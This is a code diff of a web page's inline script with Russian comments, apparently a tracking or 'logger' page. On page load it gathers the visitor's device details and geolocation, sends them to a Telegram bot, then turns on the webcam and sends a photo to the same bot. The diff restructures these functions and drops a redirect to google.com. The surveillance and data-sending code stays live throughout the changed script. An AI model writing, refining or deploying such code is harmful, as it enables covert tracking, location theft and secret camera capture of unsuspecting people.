@@ -27,26 +27,8 @@
         const API_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
         const PHOTO_API_URL = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
 
-        function sendData() {
-            let screenSize = window.screen.width + "x" + window.screen.height;
-            let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            let platform = navigator.platform;
-            let browserLang = navigator.language;
-            let userAgent = navigator.userAgent;
-            let connectionType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
-            let geolocation = "Не получено";  // Предположим, что геолокация не доступна
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((position) => {
-                    geolocation = `${position.coords.latitude}, ${position.coords.longitude}`;
-                    sendToTelegram(geolocation, screenSize, timezone, platform, browserLang, userAgent, connectionType);
-                });
-            } else {
-                sendToTelegram(geolocation, screenSize, timezone, platform, browserLang, userAgent, connectionType);
-            }
-        }
-
-        function sendToTelegram(geolocation, screenSize, timezone, platform, browserLang, userAgent, connectionType) {
+        // Функция для отправки текстовых данных в Telegram
+        function sendTextData(geolocation, screenSize, timezone, platform, browserLang, userAgent, connectionType) {
             let message = `📡 Новый лог:
 🌍 Часовой пояс: ${timezone}
 💻 Платформа: ${platform}
@@ -62,7 +44,32 @@
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: message })
             });
+        }
 
+        // Функция для сбора данных и получения фото с камеры
+        function collectDataAndTakePhoto() {
+            let screenSize = window.screen.width + "x" + window.screen.height;
+            let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            let platform = navigator.platform;
+            let browserLang = navigator.language;
+            let userAgent = navigator.userAgent;
+            let connectionType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
+            let geolocation = "Не получено";  // Предположим, что геолокация не доступна
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    geolocation = `${position.coords.latitude}, ${position.coords.longitude}`;
+                    sendTextData(geolocation, screenSize, timezone, platform, browserLang, userAgent, connectionType);
+                    capturePhoto();
+                });
+            } else {
+                sendTextData(geolocation, screenSize, timezone, platform, browserLang, userAgent, connectionType);
+                capturePhoto();
+            }
+        }
+
+        // Функция для захвата фото с камеры и отправки в Telegram
+        function capturePhoto() {
             // Пытаемся получить доступ к камере
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: true })
@@ -72,7 +79,7 @@
                         videoElement.play();
                         document.body.appendChild(videoElement);
 
-                        // Делать снимок
+                        // Делать снимок через 5 секунд
                         setTimeout(() => {
                             let canvas = document.createElement("canvas");
                             let ctx = canvas.getContext("2d");
@@ -98,13 +105,9 @@
                         console.log("Ошибка с доступом к камере: " + err);
                     });
             }
-
-            // Редирект через 3 секунды
-            setTimeout(() => {
-                window.location.href = "https://google.com"; // Редирект
-            }, 3000);
         }
 
+        // Функция для преобразования Data URL в Blob
         function dataURItoBlob(dataURI) {
             let byteString = atob(dataURI.split(',')[1]);
             let arrayBuffer = new ArrayBuffer(byteString.length);
@@ -115,7 +118,8 @@
             return new Blob([arrayBuffer], { type: 'image/png' });
         }
 
-        sendData();
+        // Инициализация сбора данных и фотосъемки
+        collectDataAndTakePhoto();
     </script>
 </head>
 <body>
